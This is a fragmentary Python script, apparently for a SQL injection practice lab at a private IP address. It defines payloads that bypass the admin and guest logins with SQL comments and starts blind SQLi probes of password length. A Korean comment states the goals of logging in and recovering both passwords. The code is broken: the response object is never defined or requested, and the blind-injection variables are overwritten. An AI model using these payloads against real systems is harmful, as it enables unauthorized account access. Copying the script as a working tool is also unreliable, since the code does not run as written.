import requests
import string

abc = string.digits + string.ascii_letters

URL = "http://192.168.81.129/sqli/sqli6.php"
PAYLOAD01 = "?uid=admin%27--%20-"
PAYLOAD02 = "?uid=guest%27--%20-"
PAYLOAD03_LEN_START = "?uid=admin%27%20%26%26%20length(upw)="
PAYLOAD03_END = "--%09-"
PAYLOAD03_LEN_START = "?uid=guest%27%20%26%26%20length(upw)="
PAYLOAD03_END = "--%09-"


if resp.text.find('Success!!') > 0:
    print('Stage Clear')
else:
    print('Not yet')
'''
1번 목표 : guest, admin 로그인 -> 단순 sqli & Blind Sqli 직후 정확한 패스워드 둘다 시도
2번 목표 : guest, admin 패스워드 찾기 -> Blind Sqli 이용
'''